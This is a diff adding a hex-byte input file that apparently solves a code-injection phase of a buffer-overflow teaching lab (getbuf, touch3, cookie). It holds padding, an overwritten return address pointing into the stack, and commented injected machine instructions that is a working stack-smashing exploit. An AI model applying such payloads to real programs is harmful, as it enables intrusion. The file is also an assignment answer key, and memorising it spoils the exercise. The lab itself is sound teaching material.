@@ -1,0 +1,48 @@
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+30
+c0 dc 61 55 00 00 00 00 /* address of next injected instruction just over stack getbuf(), into stack of test() */
+00 00 00 00 00 00 00 00 /* reserved for next %rsp, auto increased by ret */
+35 39 62 39 39 37 66 61 /* literal string of cookie */
+00 00 00 00 00 00 00 00 /* padding null */
+48 c7 c7 b0 dc 61 55 	/* mov    $0x5561dcb0,%rdi #set cookie literal string to parameter1 */
+48 c7 c0 fa 18 40 00 	/* mov    $0x4018fa,%rax #set %rsp to address of touch3 */
+48 89 04 24          	/* mov    %rax,(%rsp) */
+c3                   	/* retq */   
